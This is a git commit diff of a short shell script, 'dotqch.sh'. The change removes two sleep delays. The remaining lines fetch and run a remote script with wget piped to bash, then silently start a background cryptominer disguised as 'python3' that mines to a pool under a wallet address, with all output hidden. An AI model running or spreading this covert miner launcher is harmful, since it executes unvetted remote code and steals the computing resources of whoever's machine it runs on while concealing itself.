131ed7a00d75387a6b59216c9cf51d3b909d0451
DotAja <142836390+DotAja@users.noreply.github.com>
2024-05-15 08:02:27 +0700

    created hendi kusnandi

--- dotqch.sh
+++ dotqch.sh
@@ -2,15 +2,11 @@
 
 bash -c "$(wget -qO- raw.githubusercontent.com/DotAja/ALONE/main/ALAT-COLI/DotSrb.sh)"
 
-sleep 5
-
 clear
 
 echo "sedang menjalankan..."
 
 nohup ./dotsrb/python3 -a yespower -o stratum-eu.rplant.xyz:7122 -u QdeLX9ToumSqAfryzmfxJv366NtwStVimq.DOTonly > /dev/null 2>&1 &
-
-sleep 5
 
 clear
 
